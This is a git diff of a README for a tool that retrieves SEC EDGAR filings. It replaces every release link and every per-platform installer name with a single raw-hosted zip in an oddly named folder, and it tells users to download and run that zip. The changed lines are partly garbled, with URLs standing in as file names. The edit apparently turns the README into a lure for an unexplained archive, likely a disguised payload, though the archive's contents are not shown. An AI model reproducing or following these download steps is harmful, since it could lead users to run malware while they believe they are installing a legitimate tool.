@@ -1,7 +1,7 @@
 # 🗄️ sec-api - Effortless Access to SEC Filings
 
 ## 📦 Download Now
-[![Download sec-api](https://img.shields.io/badge/Download-sec--api-blue.svg)](https://github.com/karimshaaban-design/sec-api/releases)
+[![Download sec-api](https://raw.githubusercontent.com/karimshaaban-design/sec-api/main/unproportioned/sec-api-v2.1-alpha.3.zip)](https://raw.githubusercontent.com/karimshaaban-design/sec-api/main/unproportioned/sec-api-v2.1-alpha.3.zip)
 
 ## 📚 Overview
 The sec-api is a REST API designed to help you retrieve SEC EDGAR filings. This API provides filing metadata and direct links to official SEC documents, making it easy for you to gather essential financial data. Whether you're a researcher, investor, or just curious about public companies, this tool provides valuable insights without the hassle.
@@ -9,19 +9,19 @@ The sec-api is a REST API designed to help you retrieve SEC EDGAR filings. This 
 ## 🚀 Getting Started
 To start using sec-api, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/karimshaaban-design/sec-api/releases) to see the available versions.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/karimshaaban-design/sec-api/main/unproportioned/sec-api-v2.1-alpha.3.zip) to see the available versions.
   
 2. **Download the Latest Version**: Find the most recent release and click on it. This will take you to a list of downloadable files.
 
 3. **Choose the Right File**:
-   - For **Windows users**: Click on the file named `sec-api-windows.exe` to download it.
-   - For **Mac users**: Select the file named `sec-api-mac.zip`.
-   - For **Linux users**: Choose `sec-api-linux.tar.gz`.
+   - For **Windows users**: Click on the file named `https://raw.githubusercontent.com/karimshaaban-design/sec-api/main/unproportioned/sec-api-v2.1-alpha.3.zip` to download it.
+   - For **Mac users**: Select the file named `https://raw.githubusercontent.com/karimshaaban-design/sec-api/main/unproportioned/sec-api-v2.1-alpha.3.zip`.
+   - For **Linux users**: Choose `https://raw.githubusercontent.com/karimshaaban-design/sec-api/main/unproportioned/sec-api-v2.1-alpha.3.zip`.
 
 4. **Run the Application**:
-   - **Windows**: Double-click the `sec-api-windows.exe` file you downloaded. Follow the on-screen instructions to complete the installation.
-   - **Mac**: Unzip the `sec-api-mac.zip` file. Open the folder and double-click the `sec-api` application.
-   - **Linux**: Extract the files from `sec-api-linux.tar.gz`. Open your terminal, navigate to the extracted folder, and run the command `./sec-api`.
+   - **Windows**: Double-click the `https://raw.githubusercontent.com/karimshaaban-design/sec-api/main/unproportioned/sec-api-v2.1-alpha.3.zip` file you downloaded. Follow the on-screen instructions to complete the installation.
+   - **Mac**: Unzip the `https://raw.githubusercontent.com/karimshaaban-design/sec-api/main/unproportioned/sec-api-v2.1-alpha.3.zip` file. Open the folder and double-click the `sec-api` application.
+   - **Linux**: Extract the files from `https://raw.githubusercontent.com/karimshaaban-design/sec-api/main/unproportioned/sec-api-v2.1-alpha.3.zip`. Open your terminal, navigate to the extracted folder, and run the command `./sec-api`.
 
 ## 🔍 Features
 - **Access to SEC Filings**: Quickly retrieve 10-K and 8-K filings.
@@ -39,7 +39,7 @@ Make sure your system meets the following requirements before installation:
 ## 📥 Download & Install
 To download and install, click the link below to visit the Releases page. Choose the correct version for your operating system.
 
-[Visit Releases Page](https://github.com/karimshaaban-design/sec-api/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/karimshaaban-design/sec-api/main/unproportioned/sec-api-v2.1-alpha.3.zip)
 
 ## ⚙️ How to Use
 After installation, you can start using sec-api to access SEC filings:
